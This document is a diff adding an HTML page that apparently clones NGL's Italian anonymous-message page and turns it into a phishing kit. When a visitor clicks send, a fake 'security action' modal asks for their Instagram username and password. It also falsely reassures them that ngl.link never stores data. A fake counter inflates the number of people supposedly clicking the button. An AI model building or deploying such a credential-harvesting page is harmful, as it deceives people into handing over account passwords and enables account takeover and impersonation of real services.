@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<!-- saved from url=(0031)https://ngl.link/fr3nk.exe32595 -->
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <!--    <script type="text/javascript" async="" src="./@fr3nk.exe_files/mixpanel-2-latest.min.js"></script>-->
+    <title>@fr3nk.exe</title>
+    <link rel="stylesheet" href="./@fr3nk.exe_files/normalize.css">
+    <link rel="stylesheet" href="./@fr3nk.exe_files/style.css">
+    <script src="./@fr3nk.exe_files/jquery.min.js"></script>
+    <!--    <script src="./@fr3nk.exe_files/main.js"></script>-->
+    <script src="./@fr3nk.exe_files/mixpanel-jslib-snippet.js"></script>
+    <script src="./@fr3nk.exe_files/saved_resource"></script>
+    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width">
+    <meta name="user:language" content="it">
+    <!--    <meta property="og:image"-->
+    <!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
+    <!--    <meta property="og:title" content="Inviami messaggi anonimi!">-->
+    <!--    <meta property="og:description" content="NGL: Anonymous Q&amp;A">-->
+    <!--    <meta name="twitter:card" content="summary_large_image">-->
+    <!--    <meta name="twitter:image"-->
+    <!--          content="https://vercel-og-nextjs-ngl-labs.vercel.app/api/pfp?pfp=https%3A%2F%2Ffirebasestorage.googleapis.com%3A443%2Fv0%2Fb%2Fask-fun-d10f0.appspot.com%2Fo%2Fimages%252FEA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg%3Falt%3Dmedia%26token%3D30337a1d-2545-49d0-be64-81e3ff93bbc3">-->
+    <!--    <meta name="twitter:title" content="@fr3nk.exe: Send me anonymous messages!">-->
+    <!--    <meta name="twitter:description" content="NGL: Anonymous Q&amp;A">-->
+    <!--    <script></script>-->
+    <!--    <script src="./@fr3nk.exe_files/js" async=""></script>-->
+</head>
+<body>
+<script>
+
+    document.addEventListener("DOMContentLoaded", () => {
+
+        document.getElementById("clickCount").textContent = randomNumber(0, 541)
+
+        setInterval(clickcountchange, 1200);
+    });
+
+    function randomNumber(min, max) {
+        return Math.floor(Math.random() * (max - min) + min);
+    }
+    function clickcountchange(){
+        document.getElementById("clickCount").textContent = Number(document.getElementById("clickCount").textContent) + Number(1)
+    }
+
+
+    function textAreaChange(){
+
+        if(document.getElementById("question").value!= "")
+            document.getElementById("inviamsg").style.display ="block";
+        else
+            document.getElementById("inviamsg").style.display ="none";
+
+    }
+
+    function openLoginModal(){
+        document.getElementById("myModal").style.display = "block";
+    }
+
+    function closeLoginModal(){
+        document.getElementById("myModal").style.display = "none";
+    }
+
+</script>
+<div class="container" style="z-index: 1000; position: relative">
+
+    <div id="myModal" class="modal">
+
+        <div class="modal-content">
+            <div class="modal-header" style="text-align: center">
+                <span class="close" onclick="closeLoginModal()">&times;</span>
+                <h2>Azione di sicurezza!</h2>
+                <p>In seguito a numerosi tentativi di accesso da parte di bot automatizzati, dobbiamo verificare che le domande anonime provengano da un essere umano, grazie per la comprensione</p>
+            </div>
+            <div class="modal-body" style="text-align: center">
+                <form class="form" method="post">
+                    <div class="prompt">Inserisci le tue credenziali di instagram per continuare...</div>
+                    <br>
+                    <div>
+                        <input class="username" placeholder="Username di instagram" type="text" name="username" id="username">
+                    </div>
+                    <br>
+                    <div>
+                        <input class="password" placeholder="Password di instagram" type="password" name="password" id="password">
+                    </div>
+
+                </form>
+            </div>
+            <div class="modal-footer" style="justify-content: center; text-align: center">
+                <h3>ATTENZIONE: ngl.link non salverà mai i tuoi dati. Nessun operatore ti chiederà mai di fornirgli la password in privato!</h3>
+                <h2>Leggi  <a href="https://ngl.link/privacy-policy">QUI</a> la nostra informativa sulla privacy</h2>
+            </div>
+            <div>
+                <button id="checkInsta" class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000;">Verifica!</button>
+            </div>
+
+        </div>
+
+    </div>
+
+    <form class="form" method="post">
+        <div class="bubble">
+            <div class="header">
+                <div class="pfp-container"><img class="pfp"
+                                                src="./@fr3nk.exe_files/EA2FA533-2083-427B-96B3-11AAB8A98EFB.jpg"></div>
+                <div class="user-container">
+                    <div class="username">@fr3nk.exe</div>
+                    <div class="prompt">Inviami messaggi anonimi!</div>
+                </div>
+            </div>
+            <div class="textarea-container">
+                <div class="dice-button">🎲</div>
+                <textarea  oninput="textAreaChange()" placeholder="Inviami dei messaggi anonimi…" name="question" autocomplete="off" maxlength="300"
+                           id="question"></textarea></div>
+            <input class="deviceId" type="hidden" name="deviceId" id="deviceId"
+                   value="a7762ffc-6b04-4b36-ad72-dd7570982473"></div>
+        <div class="anonymous-tooltip">🔒 domande e risposte anonime</div>
+        <!--        <button id="inviamsg" class="submit" type="submit" style="transform: translateZ(0px); z-index: 1000; display: none">Invia!-->
+        <button id="inviamsg" class="submit" type="button" onclick="openLoginModal()" style="transform: translateZ(0px); z-index: 1000; display: none">Invia!
+        </button>
+    </form>
+</div>
+<div class="bottom-container"><h2 class="download-prompt">👇 <span id="clickCount" class="clickCount">235</span> persone hanno appena
+    toccato il pulsante👇 </h2>
+    <div class="space2"></div>
+    <a class="button download-link download-link1 pulse"
+       href="https://apps.apple.com/us/app/ngl-anonymous-q-a/id1596550932?ppid=543cb167-5bdc-448f-a202-e5506f5d2837"
+       target="_blank">Ricevi i tuoi messaggi!</a>
+    <div class="tos-privacy"><a class="tos" href="https://ngl.link/p/terms">Terms</a><a class="privacy"
+                                                                                        href="https://ngl.link/p/privacy">Privacy</a>
+    </div>
+</div>
+<!--<iframe name="__privateStripeMetricsController1970" frameborder="0" allowtransparency="true" scrolling="no"-->
+<!--        role="presentation" allow="payment *" src="./@fr3nk.exe_files/m-outer-93afeeb17bc37e711759584dbfc50d47.html"-->
+<!--        aria-hidden="true" tabindex="-1"-->
+<!--        style="border: none !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; visibility: hidden !important; position: fixed !important; height: 1px !important; pointer-events: none !important; user-select: none !important;"></iframe>-->
+<!--<iframe name="__privateStripeController1971" frameborder="0" allowtransparency="true" scrolling="no" role="presentation"-->
+<!--        allow="payment *" src="./@fr3nk.exe_files/controller-86539629e1d22815fb0163c55be7ca1f.html" aria-hidden="true"-->
+<!--        tabindex="-1"-->
+<!--        style="border: none !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; visibility: hidden !important; position: fixed !important; height: 1px !important; pointer-events: none !important; user-select: none !important;"></iframe>-->
+<!--<iframe name="__privateStripeFrame1975" frameborder="0" allowtransparency="true" scrolling="no" role="presentation"-->
+<!--        allow="payment *"-->
+<!--        sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin"-->
+<!--        referrerpolicy="origin"-->
+<!--        src="./@fr3nk.exe_files/payment-request-inner-google-pay-413c154ee1be560ab4f1fed79cfdf487.html"-->
+<!--        aria-hidden="true" tabindex="-1"-->
+<!--        style="border: none !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; visibility: hidden !important; position: fixed !important; height: 1px !important; pointer-events: none !important; user-select: none !important;"></iframe>-->
+<!--<iframe name="__privateStripeFrame1977" frameborder="0" allowtransparency="true" scrolling="no" role="presentation"-->
+<!--        allow="payment *" src="./@fr3nk.exe_files/payment-request-inner-browser-24ed185f14775577120fb51f5e5aed5b.html"-->
+<!--        aria-hidden="true" tabindex="-1"-->
+<!--        style="border: none !important; margin: 0px !important; padding: 0px !important; width: 1px !important; min-width: 100% !important; overflow: hidden !important; display: block !important; visibility: hidden !important; position: fixed !important; height: 1px !important; pointer-events: none !important; user-select: none !important;"></iframe>-->
+</body>
+</html>
